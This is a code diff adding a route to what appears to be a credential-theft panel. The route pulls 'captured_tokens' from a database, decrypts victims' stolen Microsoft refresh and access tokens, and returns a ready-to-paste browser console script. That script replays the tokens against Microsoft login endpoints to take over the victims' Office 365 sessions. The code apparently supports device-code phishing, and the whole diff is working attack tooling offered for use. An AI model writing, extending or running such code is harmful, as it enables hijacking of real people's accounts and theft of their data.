@@ -454,6 +454,83 @@ router.get('/:id/renewals', userAuth, async (req, res) => {
   }
 });
 
+// One-shot console script for direct cookie injection (no proxy, no Electron)
+// GET /api/inject-script?token_id=XYZ
+router.get('/inject-script', userAuth, async (req, res) => {
+  try {
+    const { token_id } = req.query;
+    if (!token_id) {
+      return res.status(400).json({ error: 'token_id is required' });
+    }
+
+    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [token_id, req.user.id]);
+    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
+
+    const token = tokens[0];
+    const refreshToken = decrypt(token.refresh_token_encrypted);
+    const accessToken = decrypt(token.access_token_encrypted);
+
+    if (!refreshToken && !accessToken) {
+      return res.status(400).json({ error: 'No tokens available for injection' });
+    }
+
+    // Use the REAL refresh token (not PRT blob)
+    const tokenToUse = refreshToken || accessToken;
+    
+    // Get client_id from config (same one used in device code flow)
+    const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+
+    // Generate the one-shot console script
+    const script = `(async function() {
+  const refreshToken = "${tokenToUse}";
+  const clientId = "${clientId}";
+
+  const body = new URLSearchParams({
+    client_id: clientId,
+    grant_type: "refresh_token",
+    refresh_token: refreshToken,
+    scope: "https://graph.microsoft.com/.default offline_access openid profile"
+  });
+
+  const endpoints = [
+    { url: "https://login.microsoftonline.com/common/oauth2/v2.0/token", type: "work" },
+    { url: "https://login.microsoftonline.com/consumers/oauth2/v2.0/token", type: "personal" }
+  ];
+
+  for (const ep of endpoints) {
+    try {
+      const resp = await fetch(ep.url, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: body.toString(),
+        credentials: "include"
+      });
+      if (resp.ok) {
+        window.location.href = "https://www.office.com/";
+        return;
+      } else if (resp.status === 400) {
+        const errText = await resp.text();
+        if (errText.includes("invalid_grant") && ep.type === "work") continue;
+        console.error("Exchange failed:", errText);
+        alert("Token exchange failed. The refresh token may be expired.");
+        return;
+      }
+    } catch (e) {
+      console.error("Network error:", e);
+      alert("Network error during exchange.");
+      return;
+    }
+  }
+  alert("Token exchange failed for all account types.");
+})();`;
+
+    res.type('application/javascript').send(script);
+  } catch (err) {
+    console.error('[Tokens] Inject script error:', err);
+    res.status(500).json({ error: 'Failed to generate script' });
+  }
+});
+
 // Manual cookie conversion from pasted access token
 router.post('/convert-cookie', userAuth, async (req, res) => {
   try {
